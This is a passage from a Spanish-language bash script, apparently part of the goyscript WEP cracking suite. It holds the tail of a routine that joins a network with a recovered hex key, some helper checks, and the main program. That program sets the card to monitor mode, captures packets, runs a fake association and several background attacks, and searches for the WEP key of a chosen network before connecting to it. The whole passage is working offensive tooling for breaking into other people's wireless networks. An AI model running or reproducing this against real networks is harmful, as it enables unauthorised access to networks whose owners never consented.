	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: $amarillo"SÍ"
	echo -e "$cyan\n"
	echo -e "Configurando la tarjeta WiFi para conectarse a la red \"$NOMBRE_AP\"..."$grisC""
	echo
	killall -q dhcpcd dhclient udhcpc > /dev/null 2>&1
	desactivar_modo_monitor
	iwconfig $INTERFAZ mode managed essid "$NOMBRE_AP" key $CLAVE_HEXADECIMAL
	echo -e ""$cyan"Iniciando cliente DHCP..."$grisC"\n"
	which dhcpcd > /dev/null 2>&1
	if [ $? -eq 0 ]
	then
		dhcpcd $INTERFAZ
	else
		which dhclient > /dev/null 2>&1
		if [ $? -eq 0 ]
		then
			dhclient $INTERFAZ
		else
			which udhcpc > /dev/null 2>&1
			if [ $? -eq 0 ]
			then
				udhcpc -H box -b -i $INTERFAZ
			else
				echo -e "$rojoC"
				echo "No ha sido posible realizar la conexión."
				echo "No hay instalado ningún cliente DHCP."
				echo -e "$grisC"
				exit
			fi
		fi
	fi
	if [ $? != 0 ] #SI NO VA A LA PRIMERA ES PROBABLE QUE A LA SEGUNDA SI
	then
		echo -e "\n"$rojoC"No se ha podido conectar."$cyan" Reintentando..."
		echo -e "$grisC"
		which dhcpcd > /dev/null 2>&1
		if [ $? -eq 0 ]
		then
			dhcpcd $INTERFAZ
		else
			which dhclient > /dev/null 2>&1
			if [ $? -eq 0 ]
			then
				dhclient $INTERFAZ
			else
				which udhcpc > /dev/null 2>&1
				if [ $? -eq 0 ]
				then
					udhcpc -H box -b -i $INTERFAZ
				else
					echo -e "$rojoC"
					echo "No ha sido posible realizar la conexión."
					echo "No hay instalado ningun servidor DHCP."
					echo -e "$grisC"
					exit
				fi
			fi
		fi
	fi
	if [ $? != 0 ] #SI NO VA A LA SEGUNDA NO CREO QUE VAYA BIEN LA COSA :D
	then
		echo -e "$rojoC"
		echo "No ha sido posible realizar la conexión."
		echo "Probablemente estás demasiado lejos del punto de acceso."
		echo -e "$grisC"
	else
		echo -e "$cyan"
		echo "Configuración finalizada. Comprueba si tienes conexión."
		echo -e "$grisC"
		NAVEGADOR=`which firefox`
		if [ "$NAVEGADOR" != "" ]
		then
			$NAVEGADOR www.google.es & > /dev/null 2>&1
			echo -e "$verdeC"
			echo "Abriendo \"Firefox\"..."
			echo -e "$grisC"
		else
			NAVEGADOR=`which konqueror`
			if [ "$NAVEGADOR" != "" ]
			then
				$NAVEGADOR www.google.es & > /dev/null 2>&1
				echo -e "$verdeC"
				echo "Abriendo \"Konqueror\"..."
				echo -e "$grisC"
			else
				echo -e "$rojoC"
				echo "No tienes instalado \"Firefox\" ni \"Konqueror\"."
				echo "Si tienes algun otro navegador ejecútalo."
			fi
		fi
	fi
	echo -e "$cyan"
	echo -e $blanco"Pulsa una tecla para salir..."$grisC" \c"
	read -n 1 TECLA
else
	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: $amarillo"NO"
fi
echo -e "$grisC"
echo
}

#ESPERA A QUE SE PULSE UNA TECLA
pulsar_una_tecla()
{
echo
echo -e $blanco"$1"$grisC" \c"
read -n 1 TECLA
echo
echo
if [ "$1" = "Pulsa una tecla para salir..." ]
then
	exit 1
fi
}

comprobar_distribucion()
{
DISTRIBUCION=$(./software/./distro_linux.sh)
case "$DISTRIBUCION" in
"<Desconocida>")
	echo -e $rojoC"Distribución de Linux desconocida$grisC"
	echo -e $grisC;;
*)
	echo -e $verdeC"Distribución de linux detectada: $blanco$DISTRIBUCION"
	echo -e $grisC;;
esac
}

comprobar_permisos_solo_lectura()
{
rm -rf "prueba_permisos" > /dev/null 2>&1
mkdir "prueba_permisos" > /dev/null 2>&1
if [ $? -ne 0 ]
then
	echo -e $grisC
	echo -e $rojoC"  ERROR: El dispositivo está montado como sólo lectura"
	echo -e $cyanC"         Prueba a volver a montarlo con:"
	echo -e $cyanC"         mount -o remount,rw <punto_de_montaje>"
	echo -e $grisC
	echo -e $cyanC"         Ejemplo:"
	echo -e $cyanC"             mount -o remount,rw /mnt/sdb1"
	echo -e $grisC
	pulsar_una_tecla "Pulsa una tecla para salir..."
else
	rm -rf "prueba_permisos" > /dev/null 2>&1
fi
}

comprobar_root()
{
USUARIO=`whoami`
if [ "$USUARIO" != "root" ]
then
	echo -e $grisC
	echo -e $rojoC"ERROR: Necesitas permisos de root para poder"
	echo -e $rojoC"       ejecutar este script"
	echo -e $grisC
	pulsar_una_tecla "Pulsa una tecla para salir..."
fi
}


##### PROGRAMA PRINCIPAL #####

version
comprobar_permisos_solo_lectura
if [ "$WRT" = "" ]
then
	comprobar_root
fi
INTERFAZ_GRAFICA=`ps $PARAMETRO_PS | grep -e goyscriptTTY -e goyscriptWRT | grep -v grep`
if [ "$INTERFAZ_GRAFICA" = "" ]
then
	INTERFAZ_GRAFICA="SI"
else
	INTERFAZ_GRAFICA="NO"
fi

if [ "$1" == "--help" ] || [ "$1" == "--ayuda" ] || [ "$1" == "/?" ]
then
	comprobar_ayuda
fi

if [ "$1" != "--datos" ]
then
	REST=`ps $PARAMETRO_PS | grep "restaurar_" | grep -v grep`
	while [ "$REST" != "" ] #espera a que termine el script de restaurar los servicios (por si se ejecuta la suite dos veces muy seguidas)
	do
		REST=`ps $PARAMETRO_PS | grep "restaurar_" | grep -v grep`
	done
	DESDE_DATOS="NO"
	matar_procesos " Iniciando..."
	comprobar_distribucion
	if [[ -e "/sys/class/net/$1/device/driver" ]]  #Para controlar si existe la interfaz pasada como parametro.
	then                                           #Si no existe, muestra las que hay para seleccionar una
		INTERFAZ=$1
	else
		seleccionar_tarjeta
	fi
	borrar_sesiones_anteriores
	mostrar_resolucion_de_pantalla
	iniciar_tarjeta
	activar_modo_monitor
	LISTA=`echo "$*" | grep -w -e "-l" -e "-L"` # PARA CONTROLAR SI SE USÓ EL PARÁMETRO INDICADO
	if [ "$LISTA" != "" ] && [ -e "./$CAPTURA/redes_wep.goy" ]
	then
		echo -e $cyanC"Se usará la lista de redes detectadas anteriormente."$grisC
		echo
		mv "$CAPTURA/anteriorCSV.wifis-wep-clientes" "$CAPTURA/clientes_wep.csv" > /dev/null 2>&1
		sleep 1
	else
		buscar_redes
	fi
else
	DESDE_DATOS="SI"
	MAC_AP="$2"
	NOMBRE_AP="$3"
	CANAL="$4"
	INTERFAZ="$5"
	MAC_GUIONES=`echo "$MAC_AP" | sed 's/:/-/g'`
	MAC_INTERFAZ=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}'`
	borrar_sesiones_anteriores >/dev/null 2>&1
fi
nohup software/./restaurar_servicios.sh $$ >/dev/null 2>&1 & #inicia en segundo plano el script para restaurar los servicios al finalizar goyscript
while true
do
	if [ "$1" != "--datos" ]
	then
		seleccionar_red
	fi

	if [[ $CANAL -ge 1 ]] && [[ $CANAL -le 13 ]] && [[ "$NOMBRE_AP" != "" ]] #COMPRUEBA QUE LOS DATOS SON CORRECTOS PARA CONTINUAR
	then
		INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
		if [ "$INTERFACES_MONITOR" = "" ] #SE ACTIVA EL MODO MONITOR SI SE DESACTIVÓ PREVIAMENTE PARA CONECTARSE A INTERNET
		then
			echo -e $grisC
			activar_modo_monitor
		else
			INTERFAZ_MONITOR=mon0
		fi

		hora_inicio

		if [ "$1" != "--datos" ]
		then
			mostrar_datos_seleccionados
		fi
		EXISTE_CLAVE=`find $CLAVES | grep "$NOMBRE_AP ($MAC_GUIONES).txt"`
		if [ "$EXISTE_CLAVE" = "" ] #si no obtuvimos la contraseña anteriormente
		then
			captura_de_paquetes
			sleep 1
			asociacion_falsa &
			esperar_csv
			ataque_2 &
			ataque_3_1 &
			ataque_4 &
			ataque_3_2 &
			ataque_5 &
			ataque_6 &
			ataque_7 &
			detectar_ivs
			if [[ $IVS -ge 4 ]]
			then
				comprobar_posible_diccionario
				buscar_clave
			fi
			hora_fin
			calcular_tiempo
			EXISTE_CLAVE=`find $CLAVES | grep "$NOMBRE_AP ($MAC_GUIONES).txt"`
			if [ "$EXISTE_CLAVE" != "" ] #si se encontró la contraseña
			then
				mostrar_clave
				conectar_internet
			else #si no se encontró
				echo
				echo -e $rojoC"Se ha cancelado el proceso."
				echo -e "$grisC"
				matar_procesos "Cerrando procesos abiertos..."
				mostrar_duracion
			fi
		else #sinó nos ofrece la posibilidad de conectarnos a la red
			echo -e $verdeC"Contraseña obtenida anteriormente"
			echo -e $grisC
			conectar_internet
		fi
		pulsar_una_tecla "Pulsa una tecla para seleccionar otra red..."
		if [ "$1" = "--datos" ]
		then
			exit 0
		fi
	fi
done
##### FIN, es decir, ¡¡¡ POR FIN !!! ;D #####
